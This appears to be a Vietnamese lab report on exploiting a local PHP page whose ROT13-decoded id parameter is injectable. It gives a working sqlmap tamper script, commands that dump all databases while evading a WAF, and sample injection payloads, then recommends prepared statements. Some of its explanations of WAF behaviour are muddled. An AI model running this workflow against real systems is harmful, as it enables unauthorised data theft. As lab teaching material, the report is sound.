# Task 3: Báo Cáo Kiểm Cuộc Tấn Công SQLmap Qua Tamper Script (ROT13)

## 1. Phân Tích Lỗ Hổng
Dựa vào source code `rot13_vuln.php`: 
Thông qua tham số `?id=`, giá trị `id` được decode rot13 (sử dụng hàm `str_rot13`) **trước khi** được ném vào câu query SQL: `SELECT * FROM users WHERE id = $_GET['id']_decoded`

Giả sử chúng ta truyền: `?id=1` -> decoded thành `1`
Nếu truyền `' or 1=1 -- -`:
Do ứng dụng lại decode `str_rot13()`, SQL command trên Database trở thành ký tự rác (ROT13 decode 'or 1=1' không phải là 'or 1=1' nữa). Vì vậy mọi Web Application Firewall (WAF) đều không phát hiện Injection (bởi payload truyền lên HTTP là text vô nghĩa/encryped), nhưng DB lại dính SQL Injection nếu decode đúng.

**Kết luận**: Lỗi SQL Injection (String/Integer Union-based hoặc Error-Based) - Phải mã hóa Input thành ROT13 trước.

## 2. Kế Hoạch Khai Thác Bằng SQLmap
Thay vì gõ thủ công 100% (code bằng tay rot13 payloads), ta sẽ dùng SQLMap (automated tool) và **Tamper script**. SQLMap Tamper là 1 python file dùng để chỉnh sửa tự động payload TRƯỚC KHI được SQLMap ném lên server HTTP.

## 3. Quá Trình Vượt Qua WAF Bằng SQLMap Tamper

**Cách ROT13 Cản Trở SQLMap Ban Đầu:**
Một câu lệnh bình thường như:
```sql
Payload SQLmap: ?id=1' AND 1=1 --
```
Khi đi qua bộ lọc ROT13 (`str_rot13($_GET['id'])`) trên PHP Backend, nó biến đổi chuỗi `1' AND 1=1 --` thành:
```sql
Câu truy vấn sai: SELECT * FROM `users` WHERE `id` = '1' NAQ 1=1 --
```
Lúc này, WAF bỏ qua chữ `NAQ`, Database trả lời không tìm thấy kết quả. Lỗ hổng bị che khuất và SQLMap báo lỗi `not injectable`.

**Bước 1: Viết Tamper Script Để Trực Tiếp Vượt Qua Cơ Chế Lọc**
Chúng ta tạo file tệp `tamper/rot13_tamper.py` với cấu trúc sau:
```python
import codecs
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL
def dependencies(): pass
def tamper(payload, **kwargs):
    if payload:
        return codecs.encode(payload, 'rot13') # Encode ROT13
    return payload
```
Khi gắn script này, SQLMap sẽ mã hoá Payload bằng đoạn mã Python `codecs.encode(..., 'rot13')` trước khi dội vào mục tiêu.

**Bước 2: Mở Khóa SQLmap Với Nhiều Option Đa Dạng**
Thực thi lệnh khai thác qua cờ `--tamper`:
```bash
python sqlmap.py -u "http://localhost:8003/?id=1" \
  --tamper="tamper/rot13_tamper.py" \
  -p "id" \
  --level=3 --risk=2 \  # Bật khả năng dò Error-Based Payload (Risk 2)
  --random-agent \   # Thay đổi ngẫu nhiên User-Agent ở Client
  --dbs \            # Lấy list database ban đầu
  --batch            # Tự động gõ Enter xác nhận nếu tools hỏi (tránh đứng chờ máy gõ)
```

Cuối cùng, sau khi list được tên database (`rot13_db`), chạy lệnh xả toàn bộ dữ liệu:
```bash
python sqlmap.py -u "http://localhost:8003/?id=1" \
  --tamper="tamper/rot13_tamper.py" \
  -p "id" -D rot13_db --dump-all --batch
```

**Tại sao nó hoạt động?**
Thực tế SQLMap sẽ ném HTTP request dạng: `?id=1' BE 1=1 -- -` (rot13 của `' OR 1=1`).
Khi đến backend PHP: `$decoded_id` sẽ được decode từ `1' BE 1=1` do `str_rot13` là hàm đối xứng, biến ngược thành `1' OR 1=1 -- -`. Lọt thẳng vào query hoàn chỉnh do không có bất kì filter prepared statements nào.

## 4. Cách Khắc Phục (Vá Lỗi)
Mã hoá data (Base64, ROT13, Hex) KHÔNG PHẢI LÀ BIỆN PHÁP CHỐNG SQL INJECTION. Cần áp dụng **Prepared Statements** để phân tách dứt khoát ranh giới giữa dữ liệu nhập vào (cả khi đã decode) và lệnh thực thi.
